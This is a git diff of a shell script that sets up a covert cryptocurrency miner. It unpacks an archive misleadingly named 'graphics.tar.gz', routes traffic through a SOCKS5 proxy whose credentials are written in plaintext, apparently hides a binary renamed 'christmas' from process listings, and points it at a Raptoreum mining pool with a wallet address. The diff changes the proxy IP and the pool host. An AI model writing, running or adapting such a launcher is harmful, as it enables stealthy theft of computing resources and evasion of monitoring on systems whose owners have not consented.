@@ -16,7 +16,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 3.16.66.235:1080
+socks5 = 52.53.187.94:1080
 socks5_username = mikrotik999
 socks5_password = Elibawnos
 END
@@ -35,4 +35,4 @@ chmod +x christmas
 
 ph add christmas
 
-./graftcp/graftcp ./christmas -a gr -o stratum+ssl://na-rtm.pool-server.com:5555 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz72 -p IhatePopUps
+./graftcp/graftcp ./christmas -a gr -o stratum+tcp://raptoreumemporium.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz72 -p IhatePopUps
